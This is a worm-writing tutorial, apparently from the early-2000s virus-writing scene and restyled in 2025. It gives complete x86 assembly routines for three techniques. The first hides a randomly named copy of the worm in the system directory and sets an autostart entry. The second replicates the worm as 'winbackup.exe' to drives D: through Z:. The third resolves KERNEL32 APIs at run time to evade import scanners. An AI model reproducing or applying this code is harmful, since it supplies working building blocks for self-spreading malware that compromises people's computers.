# 🛠️ Some Practice Technics  
### ✍️ By PetiK (02/10/2002) — Remastered in 2025

---

## 📌 Introduction

This article presents some techniques that I used for my worms.  
I’m not a top-tier coder like Benny, GriYO, or Bumblebee, but I want to share what I know.  
Each section includes example source code.

### Summary:
- I: Hide a copy of the worm  
- II: Spread a worm into different drives  
- III: Extract API from `KERNEL32.DLL`

---

## 🔒 I. Hide a Copy of the Worm

Many worms use static filenames like:
- `services.exe` (XTC)
- `winmine.exe` (Chainsaw)
- `wsock2.dll` (Icecubes)

That makes them easy to find and delete.  
So instead, I randomize the filename at each execution using API calls and `GetTickCount()`.

### 📄 Technique:

```asm
.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

include Useful.inc

start_worm:
    push    50
    mov esi,offset orig_worm
    push    esi
    push    0
    api GetModuleFileNameA

    mov edi,offset copy_worm
    push    edi
    push    50
    push    edi
    api GetSystemDirectoryA
    add edi,eax
    mov al,"\"
    stosb
    api GetTickCount
    push    9
    pop ecx
    xor edx,edx
    div ecx
    inc edx
    mov ecx,edx
copy_g:
    push    ecx
    api GetTickCount
    push    'z'-'a'
    pop ecx
    xor edx,edx
    div ecx
    xchg    eax,edx
    add al,'a'
    stosb
    api GetTickCount
    push    100
    pop ecx
    xor edx,edx
    div ecx
    push    edx
    api Sleep
    pop ecx
    loop    copy_g
    mov eax,"exe."
    stosd
    pop edi

    push    50
    push    offset wininit
    api GetWindowsDirectoryA
    @pushsz "\WININIT.INI"
    push    offset wininit
    api lstrcat
    push    offset wininit
    push    esi
    @pushsz "NUL"
    @pushsz "rename"
    api WritePrivateProfileStringA

copy_w:
    push    0
    push    edi
    push    esi
    api CopyFileA

run_w:
    push    edi
    @pushsz "RUN"
    @pushsz "WINDOWS"
    api WriteProfileStringA

end_worm:
    push    0
    api ExitProcess

.data
copy_worm   db 50 dup (0)
orig_worm   db 50 dup (0)
wininit     db 50 dup (0)

end start_worm
end
```

---

## 💾 II. Spread a Worm into Different Drives

Replicate the worm across multiple drives to ensure persistence.

```asm
.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

include Useful.inc

start_worm:
    push    50
    mov esi,offset orig_worm
    push    esi
    push    0
    api GetModuleFileNameA

spread_system:
    call    @lect
    db  "D:\",0
    db  "E:\",0
    db  "F:\",0
    db  "G:\",0
    db  "H:\",0
    db  "I:\",0
    db  "J:\",0
    db  "K:\",0
    db  "L:\",0
    db  "M:\",0
    db  "N:\",0
    db  "O:\",0
    db  "P:\",0
    db  "Q:\",0
    db  "R:\",0
    db  "S:\",0
    db  "T:\",0
    db  "U:\",0
    db  "V:\",0
    db  "W:\",0
    db  "X:\",0
    db  "Y:\",0
    db  "Z:\",0
@lect:
    pop esi
    push    23
    pop ecx
loop_lect:
    push    ecx
    push    esi
    api SetCurrentDirectoryA
    push    0
    @pushsz "winbackup.exe"
    push    offset orig_worm
    api CopyFileA
    @endsz
    pop ecx
    loop    loop_lect

end_spread_system:
end_worm:
    push    0
    api ExitProcess

.data
orig_worm   db 50 dup (0)
lect        db 50 dup (0)

end start_worm
end
```

---

## 🧠 III. Extract API from `KERNEL32.DLL`

To avoid detection by import scanners, resolve API addresses dynamically.

```asm
.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

include Useful.inc

start_worm:
    @pushsz "KERNEL32.DLL"
    api GetModuleHandleA
    xchg    eax,ebx

kern    macro x
    push    offset sz&x
    push    ebx
    api GetProcAddress
    mov _ptk&x,eax
endm

    kern    CloseHandle
    kern    CreateFileA
    kern    WriteFile

prep_spread_worm:
    push    0
    push    80h
    push    2
    push    0
    push    1
    push    40000000h
    @pushsz "C:\KernApi.txt"
    call    _ptkCreateFileA
    xchg    eax,ebx
    push    0
    push    offset octets
    push    e_txt - s_txt
    push    offset s_txt
    push    ebx
    call    _ptkWriteFile
    push    ebx
    call    _ptkCloseHandle

.data
octets  dd ?

szCloseHandle       db "CloseHandle",0
szCreateFileA       db "CreateFileA",0
szWriteFile         db "WriteFile",0

_ptkCloseHandle     dd ?
_ptkCreateFileA     dd ?
_ptkWriteFile       dd ?

s_txt:  db 'Text file create with',13,10
        db 'APIs extract from',13,10
        db 'KERNEL32.DLL library',13,10,13,10
        db 9,'PetiK',13,10
e_txt:

end start_worm
end
```

---

## 📬 Conclusion

If you have questions or suggestions, feel free to reach out:  
✉️ **petikvx@multimania.com**  
🌐 **www.petikvx.fr.fm**
